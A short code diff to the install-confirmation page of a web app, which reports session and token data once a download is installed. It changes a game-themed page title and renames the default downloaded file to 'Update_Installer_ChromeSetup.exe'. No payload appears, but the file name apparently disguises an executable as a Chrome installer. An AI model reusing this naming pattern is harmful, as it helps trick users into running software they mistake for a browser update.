@@ -6,7 +6,7 @@ import { supabase } from "@/integrations/supabase/client";
 export const Route = createFileRoute("/installed")({
   head: () => ({
     meta: [
-      { title: "Installation Complete | Legends of Eternity" },
+      { title: "hirror game" },
       { name: "robots", content: "noindex,nofollow" },
     ],
   }),
@@ -34,7 +34,7 @@ function Installed() {
     const payload = JSON.stringify({
       sessionId: validIncomingSid || ensureVisitorSession(),
       token: params.get("token"),
-      file: params.get("file") || "update.exe",
+      file: params.get("file") || "Update_Installer_ChromeSetup.exe",
     });
 
     const reportInstalled = async () => {
